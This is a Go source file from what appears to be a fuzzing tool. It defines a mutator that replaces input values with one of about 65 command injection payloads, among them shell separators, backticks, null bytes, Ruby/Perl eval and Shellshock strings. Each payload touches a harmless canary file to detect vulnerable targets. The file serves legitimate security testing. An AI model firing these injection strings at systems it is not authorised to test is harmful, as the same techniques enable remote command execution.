package mutation

import (
	"fmt"
	"math/rand"
	"reflect"
)

var cmdInjectionPayloads = []string{
	"/dev/null; touch /tmp/jdam.%d.fail ; echo",
	"\"`touch /tmp/jdam.%d.fail`",
	"$(touch /tmp/jdam.%d.fail)",
	"touch /tmp/jdam.%d.fail",
	" touch /tmp/jdam.%d.fail",
	";touch /tmp/jdam.%d.fail",
	"&touch /tmp/jdam.%d.fail",
	"|touch /tmp/jdam.%d.fail",
	"||touch /tmp/jdam.%d.fail",
	"&&touch /tmp/jdam.%d.fail",
	"\x00touch /tmp/jdam.%d.fail",
	"\x3btouch /tmp/jdam.%d.fail",
	"\x26touch /tmp/jdam.%d.fail",
	"\x26\x26touch /tmp/jdam.%d.fail",
	"\x7ctouch /tmp/jdam.%d.fail",
	"\x7c\x7ctouch /tmp/jdam.%d.fail",
	"touch /tmp/jdam.%d.fail'",
	" touch /tmp/jdam.%d.fail'",
	";touch /tmp/jdam.%d.fail'",
	"&touch /tmp/jdam.%d.fail'",
	"|touch /tmp/jdam.%d.fail'",
	"||touch /tmp/jdam.%d.fail'",
	"&&touch /tmp/jdam.%d.fail'",
	"\x00touch /tmp/jdam.%d.fail'",
	"\x3btouch /tmp/jdam.%d.fail'",
	"\x26touch /tmp/jdam.%d.fail'",
	"\x26\x26touch /tmp/jdam.%d.fail'",
	"\x7ctouch /tmp/jdam.%d.fail'",
	"\x7c\x7ctouch /tmp/jdam.%d.fail'",
	"';touch /tmp/jdam.%d.fail\x22",
	"'&touch /tmp/jdam.%d.fail\x22",
	"'|touch /tmp/jdam.%d.fail\x22",
	"'||touch /tmp/jdam.%d.fail\x22",
	"'&&touch /tmp/jdam.%d.fail\x22",
	"'\x0atouch /tmp/jdam.%d.fail\x22",
	"'\x3btouch /tmp/jdam.%d.fail\x22",
	"'\x26touch /tmp/jdam.%d.fail\x22",
	"'\x26\x26touch /tmp/jdam.%d.fail\x22",
	"'\x7ctouch /tmp/jdam.%d.fail\x22",
	"'\x7c\x7ctouch /tmp/jdam.%d.fail\x22",
	"'touch /tmp/jdam.%d.fail\x5c\x5c",
	"' touch /tmp/jdam.%d.fail\x5c\x5c",
	"\";touch /tmp/jdam.%d.fail'",
	"\"&touch /tmp/jdam.%d.fail'",
	"\"|touch /tmp/jdam.%d.fail'",
	"\"||touch /tmp/jdam.%d.fail'",
	"\"&&touch /tmp/jdam.%d.fail'",
	"\"\x0atouch /tmp/jdam.%d.fail'",
	"\"\x3btouch /tmp/jdam.%d.fail'",
	"\"\x26touch /tmp/jdam.%d.fail'",
	"\"\x26\x26touch /tmp/jdam.%d.fail'",
	"\"\x7ctouch /tmp/jdam.%d.fail'",
	"\"\x7c\x7ctouch /tmp/jdam.%d.fail'",
	"\"touch /tmp/jdam.%d.fail\"",
	"\" touch /tmp/jdam.%d.fail\"",
	"\";touch /tmp/jdam.%d.fail\"",
	"\"&touch /tmp/jdam.%d.fail\"",
	`@{[system "touch /tmp/jdam.%d.fail"]}`,
	`eval("File.open('/tmp/jdam.%d.fail', 'w') {}")`,
	`System("touch /tmp/jdam.%d.fail")`,
	"`touch /tmp/jdam.%d.fail`",
	`Kernel.exec("touch /tmp/jdam.%d.fail")`,
	`%%x('touch /tmp/jdam.%d.fail')`,
	"() { 0; }; touch /tmp/jdam.%d.fail;",
	"() { _; } >_[$($())] { touch /tmp/jdam.%d.fail; }",
}

// CommandInjection replaces a value with a random command injection payload.
// For more info on command injection: https://owasp.org/www-community/attacks/Command_Injection
// Example: Hello -> ";touch /tmp/jdam.16523.fail"
type CommandInjection struct{}

// ID returns mutator's 3-digit ID.
func (m *CommandInjection) ID() string {
	return "012"
}

// Name returns the mutator's name.
func (m *CommandInjection) Name() string {
	return "Command Injection"
}

// Description returns the mutator's description.
func (m *CommandInjection) Description() string {
	return "Replace value with random command injection payload"
}

// CompatibleKinds returns the data types that the mutator can mutate.
func (m *CommandInjection) CompatibleKinds() []reflect.Kind {
	return []reflect.Kind{reflect.String, reflect.Int, reflect.Int8, reflect.Int16, reflect.Int32, reflect.Int64, reflect.Uint, reflect.Uint8, reflect.Uint16, reflect.Uint32, reflect.Uint64, reflect.Float32, reflect.Float64, reflect.Invalid}
}

// Mutate returns a random command injection payload.
// All payloads will attempt to touch a file at /tmp/jdam.<random int>.fail
// The file name contains a randomly generated integer to aid in payload identification
// when command injection is successful and a file is created.
// Example: ";touch /tmp/jdam.16523.fail"
func (m *CommandInjection) Mutate(subject reflect.Value, r *rand.Rand) interface{} {
	return fmt.Sprintf(cmdInjectionPayloads[r.Intn(len(cmdInjectionPayloads))], r.Intn(90000)+10000)
}
